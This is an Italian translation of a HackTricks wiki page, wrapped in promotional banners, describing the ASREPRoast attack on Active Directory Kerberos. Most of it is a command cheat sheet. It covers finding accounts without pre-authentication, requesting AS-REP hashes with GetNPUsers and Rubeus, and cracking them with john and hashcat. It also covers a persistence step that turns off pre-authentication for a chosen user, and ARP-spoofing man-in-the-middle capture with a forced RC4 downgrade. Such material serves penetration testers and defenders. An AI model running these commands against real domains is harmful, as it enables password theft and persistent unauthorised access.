# ASREPRoast

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Insight sull'Hacking**\
Coinvolgiti con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie sull'Hacking in Tempo Reale**\
Resta aggiornato con il mondo dell'hacking in rapida evoluzione attraverso notizie e approfondimenti in tempo reale

**Ultime Annunci**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi!

## ASREPRoast

ASREPRoast è un attacco di sicurezza che sfrutta gli utenti che non dispongono dell'**attributo richiesto di pre-autenticazione Kerberos**. Fondamentalmente, questa vulnerabilità consente agli attaccanti di richiedere l'autenticazione per un utente dal Domain Controller (DC) senza necessità della password dell'utente. Il DC risponde quindi con un messaggio crittografato con la chiave derivata dalla password dell'utente, che gli attaccanti possono tentare di craccare offline per scoprire la password dell'utente.

I principali requisiti per questo attacco sono:
- **Mancanza di pre-autenticazione Kerberos**: Gli utenti bersaglio non devono avere questa funzionalità di sicurezza abilitata.
- **Connessione al Domain Controller (DC)**: Gli attaccanti hanno bisogno di accesso al DC per inviare richieste e ricevere messaggi crittografati.
- **Account di dominio opzionale**: Avere un account di dominio consente agli attaccanti di identificare più efficientemente gli utenti vulnerabili attraverso query LDAP. Senza un tale account, gli attaccanti devono indovinare i nomi utente.


#### Enumerazione degli utenti vulnerabili (necessita di credenziali di dominio)

{% code title="Usando Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiesta del messaggio AS_REP

{% code title="Utilizzando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Utilizzando Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting con Rubeus genererà un 4768 con un tipo di crittografia di 0x17 e un tipo di preautenticazione di 0.
{% endhint %}

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenza

Forza **preautenticazione** non richiesta per un utente in cui hai le autorizzazioni **GenericAll** (o autorizzazioni per scrivere proprietà):

{% code title="Usando Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASreproast senza credenziali
Senza la conoscenza degli utenti che non richiedono l'autenticazione Kerberos predefinita. Un attaccante può utilizzare una posizione di uomo nel mezzo per catturare i pacchetti AS-REP mentre attraversano la rete.<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) ci consente di farlo. Inoltre, lo strumento <ins>costringe le workstation client a utilizzare RC4</ins> modificando la negoziazione Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## Riferimenti

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Approfondimenti sull'Hacking**\
Interagisci con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie sull'Hacking in Tempo Reale**\
Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime Novità**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi!

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.

</details>
